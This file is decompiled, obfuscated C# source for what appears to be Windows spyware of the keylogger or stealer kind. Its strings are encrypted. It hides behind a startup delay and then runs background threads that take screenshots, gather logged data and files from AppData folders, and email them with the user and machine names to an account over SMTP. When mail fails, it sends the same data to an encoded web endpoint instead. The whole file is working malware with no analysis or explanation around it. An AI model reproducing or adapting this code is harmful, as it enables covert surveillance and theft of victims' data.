using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ns0;

namespace ns1;

internal class Class5
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12 = "";

	public static string string_13 = Class6.smethod_0("T6u5ybedirzIvZGrwdDAkK6+yrVdrcqKsZIY", "False");

	public static string string_14 = Class6.smethod_0("m7vMxMOgssyQg2WBjZUY", "False");

	public static string string_15 = Class6.smethod_0("pbrMz3+ZurnIvWCwx8wY", "False");

	public static int int_0 = 587;

	public static string string_16 = Class6.smethod_0("DLEXSite", "False");

	public static string string_17 = Class6.smethod_0("hq24u3dNaCo=", "False");

	public static string string_18 = Class6.smethod_0("Kg==", "False");

	public static string string_19 = Class6.smethod_0("Yqq1ua5XWHPCbE1ofIJtTSo=", "False");

	public static string string_20 = Class6.smethod_0("dqOzsK2WrWWfo5Gwrq+jklqou7OLnmW6rZNasbufg1qSn4FSbHOQimtoZSo=", "False");

	public static string string_21 = Class6.smethod_0("dK27sio=", "False");

	public static string string_22 = Class6.smethod_0("YpiuvKAq", "False");

	public static int int_1 = 1800000;

	public static string string_23 = "";

	public static string string_24 = "";

	public static int int_2 = 0;

	public static Class7 class7_0;

	public static Thread thread_0 = new Thread(smethod_1);

	public static Thread thread_1 = new Thread(smethod_2);

	public static Thread thread_2 = new Thread(Class10.Class11.smethod_0);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(60000);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				class7_0 = new Class7(string_24);
				Class7.smethod_1();
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			thread_0.IsBackground = true;
			thread_0.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class8.Class9.smethod_0();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_1.IsBackground = true;
			thread_1.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void smethod_0(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(int_1);
				text = "";
				string text2 = "";
				double double_ = 0.2;
				smethod_0(ref double_);
				try
				{
					WebClient webClient = new WebClient();
					text2 = Class6.smethod_0("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(Class6.smethod_0("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + Class6.smethod_0("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				double_ = 1.0;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_21, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class6.smethod_0("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				double_ = 0.3;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_24, "", false) != 0)
					{
						string_23 = string_24 + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(string_13);
							mailMessage2.To.Add(string_13);
							mailMessage2.Subject = Class6.smethod_0("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = string_23;
							try
							{
								if (Operators.CompareString(string_21, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class6.smethod_0("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(string_15);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = int_0;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = Class6.smethod_0("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class6.smethod_0("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(string_23, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				string_23 = "";
				string_24 = "";
				string_12 = "";
				int_2++;
			}
		}
	}

	public static void smethod_2()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double double_ = 25.0;
			smethod_0(ref double_);
			string text = Class6.smethod_0("fHmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XlyawqWCqKzAs0F5hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV6ZJw==", "False") + Environment.NewLine + Environment.NewLine + string_0 + Environment.NewLine + Environment.NewLine + string_1 + Environment.NewLine + Environment.NewLine + string_2 + Environment.NewLine + Environment.NewLine + string_3 + Environment.NewLine + Environment.NewLine + string_4 + Environment.NewLine + Environment.NewLine + string_5 + Environment.NewLine + Environment.NewLine + string_6 + Environment.NewLine + Environment.NewLine + string_7 + Environment.NewLine + Environment.NewLine + string_8 + Environment.NewLine + Environment.NewLine + string_9 + Environment.NewLine + Environment.NewLine + string_10 + Environment.NewLine + Environment.NewLine + string_11 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(string_13);
				mailMessage2.To.Add(string_13);
				mailMessage2.Subject = Class6.smethod_0("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", Class6.smethod_0("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = int_0;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = Class6.smethod_0("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class6.smethod_0("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", Class6.smethod_0("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
